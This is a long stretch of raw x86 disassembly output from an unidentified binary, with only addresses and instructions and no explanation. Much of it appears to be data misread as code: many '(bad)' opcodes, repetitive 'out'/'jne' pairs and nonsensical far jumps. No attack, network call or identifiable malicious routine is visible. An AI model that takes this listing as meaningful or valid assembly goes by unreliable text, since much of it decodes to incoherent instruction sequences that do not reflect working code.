  43fa70:	jne    0x43fa0b
  43fa72:	cld    
  43fa73:	push   DWORD PTR [ebp-0x67]
  43fa76:	cld    
  43fa77:	push   DWORD PTR [ebp+0x6f]
  43fa7a:	cld    
  43fa7b:	ds jne 0x43fa17
  43fa7e:	cld    
  43fa7f:	push   DWORD PTR [ebp-0x67]
  43fa82:	cld    
  43fa83:	push   DWORD PTR [ebp-0x67]
  43fa86:	cld    
  43fa87:	push   DWORD PTR [ebp-0x28]
  43fa8a:	cld    
  43fa8b:	ds jne 0x43fa90
  43fa8e:	out    0x3,eax
  43fa90:	jne    0x43fa94
  43fa92:	out    0x3,eax
  43fa94:	jne    0x43fa98
  43fa96:	out    0x3,eax
  43fa98:	jne    0x43fa9c
  43fa9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fa9b:	add    eax,0x3e70292
  43faa0:	jne    0x43faa4
  43faa2:	out    0x3,eax
  43faa4:	jne    0x43faa8
  43faa6:	out    0x3,eax
  43faa8:	jne    0x43faac
  43faaa:	pop    esi
  43faab:	push   es
  43faac:	jb     0x43fab0
  43faae:	out    0x3,eax
  43fab0:	jne    0x43fab4
  43fab2:	out    0x3,eax
  43fab4:	jne    0x43fab8
  43fab6:	out    0x3,eax
  43fab8:	jne    0x43fabc
  43faba:	mov    bl,0x5
  43fabc:	push   edx
  43fabd:	add    ah,bh
  43fabf:	add    esi,DWORD PTR [ebp+0x2]
  43fac2:	out    0x3,eax
  43fac4:	jne    0x43fac8
  43fac6:	out    0x3,eax
  43fac8:	jne    0x43facc
  43faca:	adc    BYTE PTR ds:0x3e702b2,al
  43fad0:	jne    0x43fad4
  43fad2:	out    0x3,eax
  43fad4:	add    BYTE PTR [eax],al
  43fad6:	add    BYTE PTR [eax],al
  43fad8:	add    BYTE PTR [ebp+0x2],dh
  43fadb:	out    0x3,eax
  43fadd:	jne    0x43fae1
  43fadf:	inc    ecx
  43fae0:	add    al,0x92
  43fae2:	add    ah,bh
  43fae4:	add    esi,DWORD PTR [ebp+0x2]
  43fae7:	out    0x3,eax
  43fae9:	jne    0x43faed
  43faeb:	out    0x3,eax
  43faed:	jne    0x43faf1
  43faef:	jbe    0x43faf5
  43faf1:	jb     0x43faf5
  43faf3:	out    0x3,eax
  43faf5:	jne    0x43faf9
  43faf7:	out    0x3,eax
  43faf9:	jne    0x43fafd
  43fafb:	out    0x3,eax
  43fafd:	jne    0x43fb01
  43faff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fb00:	call   DWORD PTR [ebx+0x2]
  43fb03:	out    0x3,eax
  43fb05:	jne    0x43fb09
  43fb07:	out    0x3,eax
  43fb09:	jne    0x43fb0d
  43fb0b:	add    cl,ch
  43fb0d:	jbe    0x43fb11
  43fb0f:	add    BYTE PTR ds:0xe8ffc4dd,bh
  43fb15:	jbe    0x43fb19
  43fb17:	add    cl,ch
  43fb19:	jbe    0x43fb1d
  43fb1b:	add    cl,ch
  43fb1d:	jbe    0x43fb21
  43fb1f:	add    BYTE PTR [ebp-0x17003b5a],ch
  43fb25:	jbe    0x43fb29
  43fb27:	add    cl,ch
  43fb29:	jbe    0x43fb2d
  43fb2b:	add    cl,ch
  43fb2d:	jbe    0x43fb31
  43fb2f:	add    BYTE PTR [ebp-0x3a],cl
  43fb32:	(bad)  
  43fb33:	(bad)  
  43fb34:	call   0xe943fdaf
  43fb39:	jbe    0x43fb3d
  43fb3b:	add    cl,ch
  43fb3d:	add    BYTE PTR [eax],al
  43fb3f:	add    BYTE PTR [eax],al
  43fb41:	add    BYTE PTR [esi+0x2],dh
  43fb44:	add    dh,dl
  43fb46:	test   eax,0x76e8ffc4
  43fb4b:	add    al,BYTE PTR [eax]
  43fb4d:	jmp    0xe943fdc8
  43fb52:	jbe    0x43fb56
  43fb54:	add    bh,dh
  43fb56:	dec    ecx
  43fb57:	enter  0xe8ff,0x76
  43fb5b:	add    al,BYTE PTR [eax]
  43fb5d:	jmp    0xe943fdd8
  43fb62:	jbe    0x43fb66
  43fb64:	add    BYTE PTR [eax+ebp*1],dl
  43fb67:	enter  0xe8ff,0x76
  43fb6b:	add    al,BYTE PTR [eax]
  43fb6d:	jmp    0xe943fde8
  43fb72:	jbe    0x43fb76
  43fb74:	add    BYTE PTR [eax+ecx*2],dh
  43fb77:	enter  0xe8ff,0x76
  43fb7b:	add    al,BYTE PTR [eax]
  43fb7d:	jmp    0xe943fdf8
  43fb82:	jbe    0x43fb86
  43fb84:	add    BYTE PTR [ecx-0x37dc],ah
  43fb8a:	sbb    al,0x2
  43fb8c:	add    BYTE PTR [eax],al
  43fb8e:	or     al,0x2
  43fb90:	add    BYTE PTR [eax],al
  43fb92:	or     al,0x2
  43fb94:	add    BYTE PTR [eax],al
  43fb96:	jl     0x43fbf9
  43fb98:	cmp    DWORD PTR [eax],eax
  43fb9a:	fadd   QWORD PTR [ecx]
  43fb9c:	add    BYTE PTR [eax],al
  43fb9e:	int3   
  43fb9f:	add    DWORD PTR [eax],eax
  43fba1:	add    ah,cl
  43fba3:	add    DWORD PTR [eax],eax
  43fba5:	add    BYTE PTR [eax],al
  43fba7:	add    BYTE PTR [eax],al
  43fba9:	add    BYTE PTR [eax],al
  43fbab:	push   cs
  43fbac:	popa   
  43fbad:	cmp    DWORD PTR [eax],eax
  43fbaf:	fadd   QWORD PTR [ecx]
  43fbb1:	add    BYTE PTR [eax],al
  43fbb3:	int3   
  43fbb4:	add    DWORD PTR [eax],eax
  43fbb6:	add    ah,cl
  43fbb8:	add    DWORD PTR [eax],eax
  43fbba:	add    BYTE PTR [ebp+0x61],al
  43fbbd:	cmp    DWORD PTR [eax],eax
  43fbbf:	pushf  
  43fbc0:	add    DWORD PTR [eax],eax
  43fbc2:	add    BYTE PTR [ecx+eax*1+0x18c0000],cl
  43fbc9:	add    BYTE PTR [eax],al
  43fbcb:	retf   0x3960
  43fbce:	add    BYTE PTR [ecx+eax*1+0x18c0000],bl
  43fbd5:	add    BYTE PTR [eax],al
  43fbd7:	mov    WORD PTR [ecx],es
  43fbd9:	add    BYTE PTR [eax],al
  43fbdb:	ins    BYTE PTR es:[edi],dx
  43fbdc:	cmp    DWORD PTR gs:[eax],eax
  43fbdf:	pop    esp
  43fbe0:	add    DWORD PTR [eax],eax
  43fbe2:	add    BYTE PTR [ecx+eax*1+0x0],cl
  43fbe6:	add    BYTE PTR [ecx+eax*1+0x0],cl
  43fbea:	add    ah,bl
  43fbec:	cmp    DWORD PTR gs:[eax],eax
  43fbef:	pop    esp
  43fbf0:	add    DWORD PTR [eax],eax
  43fbf2:	add    BYTE PTR [ecx+eax*1+0x0],cl
  43fbf6:	add    BYTE PTR [ecx+eax*1+0x0],cl
  43fbfa:	add    BYTE PTR [ebx+0x62],al
  43fbfd:	cmp    DWORD PTR [eax],eax
  43fbff:	sbb    al,0x1
  43fc01:	add    BYTE PTR [eax],al
  43fc03:	or     al,0x1
  43fc05:	add    BYTE PTR [eax],al
  43fc07:	jne    0x43fba4
  43fc09:	cld    
  43fc0a:	push   DWORD PTR [ebp+0x5c]
  43fc0d:	lahf   
  43fc0e:	add    BYTE PTR ds:[eax],al
  43fc11:	add    BYTE PTR [eax],al
  43fc13:	add    BYTE PTR [ebp-0x65],dh
  43fc16:	cld    
  43fc17:	push   DWORD PTR [ebp-0x65]
  43fc1a:	cld    
  43fc1b:	push   DWORD PTR [ebp-0x65]
  43fc1e:	cld    
  43fc1f:	push   DWORD PTR [ebp+0x44]
  43fc22:	lahf   
  43fc23:	ds jne 0x43fbc1
  43fc26:	cld    
  43fc27:	push   DWORD PTR [ebp-0x65]
  43fc2a:	cld    
  43fc2b:	push   DWORD PTR [ebp-0x65]
  43fc2e:	cld    
  43fc2f:	push   DWORD PTR [ebp+0x11]
  43fc32:	mov    al,ds:0xfc9b753e
  43fc37:	push   DWORD PTR [ebp-0x65]
  43fc3a:	cld    
  43fc3b:	push   DWORD PTR [ebp-0x65]
  43fc3e:	cld    
  43fc3f:	push   DWORD PTR [ebp+0xc]
  43fc42:	mov    eax,0xfc9b753d
  43fc47:	push   DWORD PTR [ebp-0x65]
  43fc4a:	cld    
  43fc4b:	push   DWORD PTR [ebp-0x65]
  43fc4e:	cld    
  43fc4f:	push   DWORD PTR [ebp-0x45]
  43fc52:	mov    cl,0x3d
  43fc54:	jne    0x43fbf1
  43fc56:	cld    
  43fc57:	push   DWORD PTR [ebp-0x65]
  43fc5a:	cld    
  43fc5b:	push   DWORD PTR [ebp-0x65]
  43fc5e:	cld    
  43fc5f:	push   DWORD PTR [ebp+0x47]
  43fc62:	mov    ch,0x3d
  43fc64:	jne    0x43fbff
  43fc66:	cld    
  43fc67:	push   DWORD PTR [ebp-0x67]
  43fc6a:	cld    
  43fc6b:	push   DWORD PTR [ebp-0x67]
  43fc6e:	cld    
  43fc6f:	push   DWORD PTR [ebp+0x17]
  43fc72:	(bad)  
  43fc73:	aas    
  43fc74:	jne    0x43fc0f
  43fc76:	cld    
  43fc77:	inc    DWORD PTR [eax]
  43fc79:	add    BYTE PTR [eax],al
  43fc7b:	add    BYTE PTR [eax],al
  43fc7d:	jne    0x43fc18
  43fc7f:	cld    
  43fc80:	push   DWORD PTR [ebp-0x67]
  43fc83:	cld    
  43fc84:	push   DWORD PTR [ebp+0x5e]
  43fc87:	lds    edi,FWORD PTR [edi]
  43fc89:	jne    0x43fc8d
  43fc8b:	out    0x3,eax
  43fc8d:	jne    0x43fc91
  43fc8f:	out    0x3,eax
  43fc91:	jne    0x43fc95
  43fc93:	out    0x3,eax
  43fc95:	jne    0x43fc99
  43fc97:	hlt    
  43fc98:	mov    edx,0x3e7024a
  43fc9d:	jne    0x43fca1
  43fc9f:	out    0x3,eax
  43fca1:	jne    0x43fca5
  43fca3:	out    0x3,eax
  43fca5:	jne    0x43fca9
  43fca7:	lfs    ebp,FWORD PTR [edx+0x7503e702]
  43fcae:	add    ah,bh
  43fcb0:	add    esi,DWORD PTR [ebp+0x2]
  43fcb3:	out    0x3,eax
  43fcb5:	jne    0x43fcb9
  43fcb7:	dec    ecx
  43fcb8:	scas   eax,DWORD PTR es:[edi]
  43fcb9:	mov    al,BYTE PTR [edx]
  43fcbb:	out    0x3,eax
  43fcbd:	jne    0x43fcc1
  43fcbf:	out    0x3,eax
  43fcc1:	jne    0x43fcc5
  43fcc3:	xor    ebx,DWORD PTR [ebx]
  43fcc5:	xor    eax,0x7503e702
  43fcca:	add    dh,BYTE PTR [edi]
  43fccc:	sbb    dh,BYTE PTR ds:0x351a2b02
  43fcd2:	add    bl,BYTE PTR [edi]
  43fcd4:	sbb    dh,BYTE PTR ds:0x351a2302
  43fcda:	add    ah,BYTE PTR [edi]
  43fcdc:	sbb    dh,BYTE PTR ds:0x19fb02
  43fce2:	add    BYTE PTR [eax],al
  43fce4:	add    BYTE PTR [eax],al
  43fce6:	xor    eax,0xb519ef02
  43fceb:	add    dh,bl
  43fced:	sbb    DWORD PTR [ebp-0x4ae628fe],esi
  43fcf3:	add    cl,bl
  43fcf5:	sbb    DWORD PTR [ebp-0x4ae640fe],esi
  43fcfb:	add    al,bl
  43fcfd:	sbb    DWORD PTR [ebp+0x7503e702],esi
  43fd03:	add    bl,BYTE PTR [edx-0x968dad]
  43fd09:	call   0xe943ff84
  43fd0e:	jbe    0x43fd12
  43fd10:	add    cl,ch
  43fd12:	jbe    0x43fd16
  43fd14:	add    cl,ch
  43fd16:	jbe    0x43fd1a
  43fd18:	add    cl,ch
  43fd1a:	jbe    0x43fd1e
  43fd1c:	add    cl,ch
  43fd1e:	jbe    0x43fd22
  43fd20:	add    cl,ch
  43fd22:	jbe    0x43fd26
  43fd24:	add    cl,ch
  43fd26:	jbe    0x43fd2a
  43fd28:	add    cl,ch
  43fd2a:	jbe    0x43fd2e
  43fd2c:	add    cl,ch
  43fd2e:	jbe    0x43fd32
  43fd30:	add    cl,ch
  43fd32:	jbe    0x43fd36
  43fd34:	add    cl,ch
  43fd36:	jbe    0x43fd3a
  43fd38:	add    cl,ch
  43fd3a:	mov    BYTE PTR [edx+0x276edf8],0x0
  43fd41:	sbb    DWORD PTR [edi-0x60a6c982],0x413666
  43fd4b:	add    BYTE PTR [eax],al
  43fd4d:	add    BYTE PTR [eax],al
  43fd4f:	iret   
  43fd50:	dec    esi
  43fd51:	ss sub edi,ecx
  43fd54:	mov    dh,0x36
  43fd56:	shl    DWORD PTR [eax+0x36e9369e],0x2
  43fd5d:	add    BYTE PTR ds:0xe5000279,cl
  43fd63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fd64:	cli    
  43fd65:	cmp    DWORD PTR [ebp-0x59],esp
  43fd68:	bound  edi,QWORD PTR [ecx]
  43fd6a:	test   DWORD PTR [edi+0x4785395a],esp
  43fd70:	mov    dl,0x39
  43fd72:	jne    0x43fdbb
  43fd74:	mov    edx,0xc2476539
  43fd79:	cmp    DWORD PTR [ebp-0x16c6b5b9],esp
  43fd7f:	xchg   BYTE PTR [edx],al
  43fd81:	add    BYTE PTR [ecx+0x70],ah
  43fd84:	add    al,BYTE PTR [eax]
  43fd86:	add    al,al
  43fd88:	push   edi
  43fd89:	hlt    
  43fd8a:	xor    DWORD PTR [eax+0x58],edx
  43fd8d:	add    al,0x32
  43fd8f:	push   eax
  43fd90:	pop    eax
  43fd91:	adc    al,0x32
  43fd93:	xor    BYTE PTR [eax+0x24],bl
  43fd96:	xor    al,BYTE PTR [eax-0x2fcdcba8]
  43fd9c:	push   edi
  43fd9d:	inc    esp
  43fd9e:	xor    dl,al
  43fda0:	push   edi
  43fda1:	push   esp
  43fda2:	xor    dh,BYTE PTR [eax]
  43fda4:	pop    eax
  43fda5:	fs xor al,al
  43fda8:	push   edi
  43fda9:	je     0x43fddd
  43fdab:	nop
  43fdac:	pop    eax
  43fdad:	test   BYTE PTR [edx],dh
  43fdaf:	push   eax
  43fdb0:	pop    eax
  43fdb1:	xchg   esp,eax
  43fdb2:	xor    al,BYTE PTR [eax]
  43fdb4:	add    BYTE PTR [eax],al
  43fdb6:	add    BYTE PTR [eax],al
  43fdb8:	lock pop eax
  43fdba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fdbb:	xor    al,BYTE PTR [eax+0x58]
  43fdbe:	mov    ah,0x32
  43fdc0:	nop
  43fdc1:	pop    eax
  43fdc2:	les    esi,FWORD PTR [edx]
  43fdc4:	nop
  43fdc5:	pop    eax
  43fdc6:	aam    0x32
  43fdc8:	jo     0x43fe22
  43fdca:	in     al,0x32
  43fdcc:	rcl    BYTE PTR [edi-0xc],0x32
  43fdd0:	rcr    BYTE PTR [eax+0x4],1
  43fdd3:	xor    edx,eax
  43fdd5:	pop    eax
  43fdd6:	adc    al,0x33
  43fdd8:	mov    al,0x58
  43fdda:	and    al,0x33
  43fddc:	sbb    BYTE PTR [ecx+0x34],0x33
  43fde0:	push   eax
  43fde1:	pop    ecx
  43fde2:	inc    esp
  43fde3:	xor    edx,DWORD PTR [eax+0x59]
  43fde6:	push   esp
  43fde7:	xor    esi,DWORD PTR [eax]
  43fde9:	pop    ecx
  43fdea:	xor    eax,DWORD PTR fs:[eax+0x59]
  43fdee:	je     0x43fe23
  43fdf0:	adc    BYTE PTR [eax-0x7c],bl
  43fdf3:	xor    edx,eax
  43fdf5:	pop    eax
  43fdf6:	xchg   esp,eax
  43fdf7:	xor    esi,eax
  43fdf9:	push   edi
  43fdfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fdfb:	xor    eax,eax
  43fdfd:	pop    eax
  43fdfe:	mov    ah,0x33
  43fe00:	adc    BYTE PTR [eax-0x3c],bl
  43fe03:	xor    esi,DWORD PTR [ebp-0x41]
  43fe06:	rcr    ebx,1
  43fe08:	xchg   BYTE PTR [edi-0x79142f],al
  43fe0e:	sar    ebx,1
  43fe10:	xchg   BYTE PTR [edi-0x30],ah
  43fe13:	or     ebp,DWORD PTR [ecx+0x5f]
  43fe16:	rcr    BYTE PTR [ebx],1
  43fe18:	popa   
  43fe19:	inc    edi
  43fe1a:	shr    BYTE PTR [ebx],1
  43fe1c:	add    BYTE PTR [eax],al
  43fe1e:	add    BYTE PTR [eax],al
  43fe20:	add    BYTE PTR [ecx+0x1f],ch
  43fe23:	fdivr  DWORD PTR [ebx]
  43fe25:	popa   
  43fe26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fe27:	ror    BYTE PTR [ebx+0x49],1
  43fe2a:	mov    edi,0x47415bd0
  43fe2f:	shr    BYTE PTR [ebx+0x49],1
  43fe32:	mov    edi,0xe7417bd0
  43fe37:	ror    BYTE PTR [ebx-0x642f2057],1
  43fe3d:	mov    eax,ds:0xa9abd087
  43fe42:	(bad)  
  43fe44:	mov    ebx,0xcbd127a1
  43fe49:	mov    DWORD PTR [edi],edi
  43fe4b:	rcr    ebx,1
  43fe4d:	add    DWORD PTR [edi],0x7f89ebd1
  43fe53:	sar    ebx,1
  43fe55:	and    DWORD PTR [edi-0x29],0xd75f680b
  43fe5c:	sbb    esp,DWORD PTR [eax+0x47]
  43fe5f:	xlat   BYTE PTR ds:[ebx]
  43fe60:	sub    ebp,DWORD PTR [eax+0x1f]
  43fe63:	sar    DWORD PTR [ebx],1
  43fe65:	pusha  
  43fe66:	daa    
  43fe67:	ror    DWORD PTR [ebx+0x48],1
  43fe6a:	aas    
  43fe6b:	rcr    DWORD PTR [ebx+0x40],1
  43fe6e:	(bad)  
  43fe6f:	shr    BYTE PTR [ebx+0x48],1
  43fe72:	aas    
  43fe73:	sar    DWORD PTR [ebx+0x40],1
  43fe76:	out    0xd0,eax
  43fe78:	mov    ebp,DWORD PTR [eax-0x5f642f23]
  43fe7e:	test   eax,edx
  43fe80:	stos   DWORD PTR es:[edi],eax
  43fe81:	test   al,0x2
  43fe83:	pop    ebx
  43fe84:	xlat   BYTE PTR ds:[ebx]
  43fe85:	add    BYTE PTR [eax],al
  43fe87:	add    BYTE PTR [eax],al
  43fe89:	add    BYTE PTR [esi],bl
  43fe8b:	mov    ss:0xbb363ed7,eax
  43fe91:	xlat   BYTE PTR ds:[ebx]
  43fe92:	cs ss adc edi,0x4e
  43fe97:	ss jnp 0x43fe71
  43fe9a:	ds ss jecxz 0x43fe77
  43fe9e:	jle    0x43fed8
  43fea0:	fcmovnu st,st(1)
  43fea2:	mov    ?,WORD PTR [eax]
  43fea4:	ret    
  43fea5:	(bad)  [esi+0x38]
  43fea8:	sbb    ebx,edx
  43feaa:	pop    esi
  43feab:	cmp    BYTE PTR [ebx-0x44c74127],ah
  43feb1:	fldcw  WORD PTR [esi-0x71263cc8]
  43feb7:	cmp    BYTE PTR [ebx+0x63387ed9],bh
  43febd:	(bad)  
  43febf:	cmp    BYTE PTR [ebx-0x26],bl
  43fec2:	push   cs
  43fec3:	cmp    DWORD PTR [ebx+0x5b390eda],eax
  43fec9:	ficomp DWORD PTR [esi]
  43fecb:	cmp    DWORD PTR [ebx],esp
  43fecd:	fidivr DWORD PTR [esi-0x5125c4c8]
  43fed3:	cmp    BYTE PTR [ebx],al
  43fed5:	fcmove st,st(6)
  43fed7:	cmp    bl,bh
  43fed9:	fnstcw WORD PTR [esi+0x7ed8e338]
  43fedf:	aaa    
  43fee0:	fcmovnu st,st(0)
  43fee2:	mov    ?,WORD PTR [edi]
  43fee4:	ret    
  43fee5:	fmul   DWORD PTR [esi+0x37]
  43fee8:	sbb    ebx,ecx
  43feea:	pop    esi
  43feeb:	aaa    
  43feec:	and    ebx,ecx
  43feee:	add    BYTE PTR [eax],al
  43fef0:	add    BYTE PTR [eax],al
  43fef2:	add    BYTE PTR [esi],bh
  43fef4:	aaa    
  43fef5:	cmp    ebx,ecx
  43fef7:	cs aaa 
  43fef9:	inc    ebx
  43fefa:	(bad)  [esi]
  43fefc:	aaa    
  43fefd:	cmp    ebx,ecx
  43feff:	(bad)  
  43ff00:	ss arpl ax,bx
  43ff03:	(bad)  
  43ff04:	add    BYTE PTR ss:[ebp+0x4d],bl
  43ff08:	fwait
  43ff09:	xor    BYTE PTR [ebp+0x5d30ab3d],al
  43ff0f:	cmp    eax,0x2da530bb
  43ff14:	dec    ebx
  43ff15:	xor    BYTE PTR [ebp-0x7acfa4d3],bh
  43ff1b:	sbb    eax,0x96e9306b
  43ff20:	add    al,BYTE PTR [eax]
  43ff22:	sub    eax,0x95000279
  43ff27:	dec    esp
  43ff28:	arpl   WORD PTR [ecx],si
  43ff2a:	jge    0x43ff68
  43ff2c:	jae    0x43ff5f
  43ff2e:	gs cmp al,0x3
  43ff31:	xor    ebp,ebp
  43ff33:	sub    eax,0x2df53113
  43ff38:	and    esi,DWORD PTR [ecx]
  43ff3a:	std    
  43ff3b:	sbb    eax,0x1c053133
  43ff40:	ret    
  43ff41:	xor    BYTE PTR [ebp-0x6acf2d33],ch
  43ff47:	int    0xe2
  43ff49:	xor    BYTE PTR [ebp-0x5acf0d43],bh
  43ff4f:	mov    ebp,0xc3ed3082
  43ff54:	jmp    0x0:0x993a
  43ff5b:	add    BYTE PTR [ebx-0x4c72c50a],bh
  43ff61:	(bad)  
  43ff62:	cmp    dh,BYTE PTR [ebp-0x55]
  43ff65:	xchg   esi,eax
  43ff66:	cmp    al,BYTE PTR [ebp-0x3d]
  43ff69:	scas   al,BYTE PTR es:[edi]
  43ff6a:	cmp    dh,BYTE PTR ds:0xe9f87ebb
  43ff70:	xchg   BYTE PTR [edx],al
  43ff72:	add    BYTE PTR [ebp-0x62fffd8f],ah
  43ff78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ff79:	mov    esi,0x46a6ad2c
  43ff7e:	sub    al,0x9d
  43ff80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ff81:	push   cs
  43ff82:	xor    al,0x0
  43ff84:	test   al,0x59
  43ff86:	loopne 0x43ffbc
  43ff88:	inc    eax
  43ff89:	pop    ebx
  43ff8a:	call   0xf09f27c3
  43ff8f:	xor    al,0x10
  43ff91:	pop    ebx
  43ff92:	clc    
  43ff93:	xor    al,0x48
  43ff95:	pop    ebx
  43ff96:	add    BYTE PTR ds:0x35085b60,dh
  43ff9c:	xor    BYTE PTR [ebx+0x64],bl
  43ff9f:	xor    eax,0x356c5b5c
  43ffa4:	je     0x440001
  43ffa6:	je     0x43ffdd
  43ffa8:	pushf  
  43ffa9:	pop    ebx
  43ffaa:	jl     0x43ffe1
  43ffac:	fs pop ebx
  43ffae:	mov    ah,0x35
  43ffb0:	int3   
  43ffb1:	pop    ebx
  43ffb2:	mov    esp,0xc45b6435
  43ffb7:	xor    eax,0x35cc5b4c
  43ffbc:	inc    esp
  43ffbd:	pop    ebx
  43ffbe:	aam    0x35
  43ffc0:	add    BYTE PTR [eax],al
  43ffc2:	add    BYTE PTR [eax],al
  43ffc4:	add    al,al
  43ffc6:	push   esp
  43ffc7:	push   0x7054b837
  43ffcc:	aaa    
  43ffcd:	xor    BYTE PTR [ebp+0x78],dl
  43ffd0:	aaa    
  43ffd1:	pop    eax
  43ffd2:	push   ebp
  43ffd3:	xor    BYTE PTR [edi],0x40
  43ffd6:	push   ebp
  43ffd7:	mov    BYTE PTR [edi],dh
  43ffd9:	pop    eax
  43ffda:	push   ebp
  43ffdb:	nop
  43ffdc:	aaa    
  43ffdd:	cwde   
  43ffde:	dec    esi
  43ffdf:	call   0xf092681c
  43ffe4:	cmp    BYTE PTR [eax+0x4e],dh
  43ffe7:	clc    
  43ffe8:	cmp    al,cl
  43ffea:	dec    esi
  43ffeb:	add    BYTE PTR [ecx],bh
  43ffed:	mov    al,ds:0x6c39a44e
  43fff2:	dec    edi
  43fff3:	lods   al,BYTE PTR ds:[esi]
  43fff4:	cmp    DWORD PTR [edi+ecx*2+0x7c],esp
  43fff8:	cmp    bh,al
  43fffa:	dec    ebx
  43fffb:	mov    al,0x3a
  43fffd:	lock dec ebx
  43ffff:	mov    eax,0xc6af753a
  440004:	(bad)  
  440005:	aas    
  440006:	lahf   
  440007:	(bad)  
  440008:	iret   
  440009:	aas    
  44000a:	lahf   
  44000b:	(bad)  
  44000c:	xlat   BYTE PTR ds:[ebx]
  44000d:	scas   eax,DWORD PTR es:[edi]
  44000e:	lahf   
  44000f:	(bad)  
  440010:	fild   QWORD PTR [edi-0x61403a09]
  440016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440017:	(bad)
  44001a:	mov    bh,0xc5
  44001c:	iret   
  44001d:	mov    ?,WORD PTR [edi-0x4871283b]
  440023:	(bad)
  440026:	xchg   ebp,eax
  440028:	pop    es
  440029:	add    BYTE PTR [eax],al
  44002b:	add    BYTE PTR [eax],al
  44002d:	add    BYTE PTR [ecx+0xb],bh
  440030:	shl    BYTE PTR [ebx+0x71],1
  440033:	adc    edx,eax
  440035:	imul   ebp,DWORD PTR [ecx+0x6b],0x7c
  440039:	jmp    DWORD PTR [edx]
  44003b:	mov    edi,0x7775fffc
  440040:	iret   
  440041:	(bad)  
  440043:	ja     0x440014
  440045:	pop    ss
  440046:	dec    eax
  440047:	sub    edx,eax
  440049:	ret    
  44004a:	inc    eax
  44004b:	and    edx,eax
  44004d:	daa    
  44004e:	cmp    dl,BYTE PTR [edi]
  440050:	leave  
  440051:	das    
  440052:	mov    dl,0x77
  440054:	leave  
  440055:	aaa    
  440056:	stos   BYTE PTR es:[edi],al
  440057:	ja     0x440022
  440059:	jnp    0x43fffd
  44005b:	jmp    0x440026
  44005d:	sbb    DWORD PTR [edx-0x6d5c360d],0x6b
  440064:	ins    BYTE PTR es:[edi],dx
  440065:	dec    edx
  440067:	and    bh,ch
  440069:	push   DWORD PTR [ebp-0x73]
  44006c:	int3   
  44006d:	lods   al,BYTE PTR ds:[esi]
  44006e:	test   DWORD PTR [eax-0x32],ebx
  440071:	and    DWORD PTR [edi-0x28],0x586602ce
  440078:	int    0x66
  44007a:	data16 cmp cl,dh
  44007d:	into   
  44007e:	data16 add bh,BYTE PTR [ecx]
  440081:	fmul   DWORD PTR [eax]
  440083:	ss ins BYTE PTR es:[edi],dx
  440085:	fcomp  st(4)
  440087:	xor    eax,0x35b1d88d
  44008c:	rcr    al,cl
  44008e:	sub    eax,0xd75137
  440093:	add    BYTE PTR [eax],al
  440095:	add    BYTE PTR [eax],al
  440097:	or     DWORD PTR [esi],esi
  440099:	jns    0x440072
  44009b:	inc    edi
  44009c:	ss mov esi,0x73472d7
  4400a2:	(bad)  
  4400a3:	stos   BYTE PTR es:[edi],al
  4400a4:	xor    al,0xf
  4400a6:	(bad)  
  4400a7:	adc    eax,0x3cd6a335
  4400ac:	xor    eax,0x351fd6b9
  4400b1:	mov    dl,dh
  4400b3:	jo     0x4400e8
  4400b5:	fst    st(4)
  4400b7:	pop    esi
  4400b8:	xor    edx,DWORD PTR [edx*8-0x2a7dcc5a]
  4400bf:	jg     0x4400fb
  4400c1:	jg     0x44008f
  4400c3:	jns    0x4400fe
  4400c5:	mov    al,0xca
  4400c7:	scas   eax,DWORD PTR es:[edi]
  4400c8:	cmp    DWORD PTR [ecx-0x35],ebp
  4400cb:	fnstcw WORD PTR [ecx]
  4400cd:	loop   0x440098
  4400cf:	cmp    BYTE PTR [eax],0x5f
  4400d2:	retf   0x38e9
  4400d5:	pusha  
  4400d6:	retf   0x38bb
  4400d9:	sub    cl,dl
  4400db:	sar    BYTE PTR [eax],0x47
  4400de:	retf   0x38e9
  4400e1:	call   0x27b84ae
  4400e6:	leave  
  4400e7:	xchg   DWORD PTR [edi],esi
  4400e9:	fmulp  st(0),st
  4400eb:	sbb    eax,0x95c92f38
  4400f0:	mov    al,ds:0x5a3e3fcf
  4400f6:	ror    BYTE PTR [edi+edi*1],1
  4400f9:	inc    esp
  4400fa:	rol    BYTE PTR [eax],1
  4400fc:	add    BYTE PTR [eax],al
  4400fe:	add    BYTE PTR [eax],al
  440100:	sar    DWORD PTR [esi],1
  440102:	add    BYTE PTR [edx],bh
  440104:	lds    esi,FWORD PTR [ebx+edi*1+0x3b42c52e]
  44010b:	int    0xc2
  44010d:	push   0x7abad73b
  440112:	cmp    esp,ecx
  440114:	mov    bl,0xa
  440116:	cmp    esi,eax
  440118:	stos   DWORD PTR es:[edi],eax
  440119:	sbb    bh,BYTE PTR [ebx]
  44011b:	adc    DWORD PTR [edx+0x2a],eax
  44011e:	cmp    esi,ebp
  440120:	cmp    edi,DWORD PTR [ebx]
  440122:	cmp    ebp,DWORD PTR [esi]
  440124:	xor    dh,bh
  440126:	cmp    ah,BYTE PTR [eax+0x2b]
  440129:	fwait
  44012a:	cmp    cl,cl
  44012c:	inc    eax
  44012d:	and    eax,0x943b123a
  440132:	cmp    DWORD PTR [edx+0x30],ecx
  440135:	lods   al,BYTE PTR ds:[esi]
  440136:	cmp    cl,ch
  440138:	(bad)  
  440139:	jnp    0x440133
  44013b:	jne    0x4401b3
  44013d:	add    al,BYTE PTR [eax]
  44013f:	lahf   
  440140:	inc    esi
  440141:	fs das 
  440143:	out    dx,eax
  440144:	inc    edi
  440145:	adc    ch,BYTE PTR [edi]
  440147:	lds    eax,FWORD PTR [edi+0x3b]
  44014a:	das    
  44014b:	ret    0xe327
  44014e:	cs (bad) 
  440150:	daa    
  440151:	mov    DWORD PTR [esi],ebp
  440153:	jge    0x44017c
  440155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440156:	and    esp,DWORD PTR cs:[edi]
  440159:	outs   dx,BYTE PTR ds:[esi]
  44015a:	cs test ah,0x11
  44015e:	cs or  bh,al
  440161:	cs cs hlt 
  440164:	add    BYTE PTR [eax],al
  440166:	add    BYTE PTR [eax],al
  440168:	add    ah,al
  44016a:	retf   
  44016b:	sub    eax,0x2decc491
  440170:	jo     0x440116
  440172:	lods   al,BYTE PTR ds:[esi]
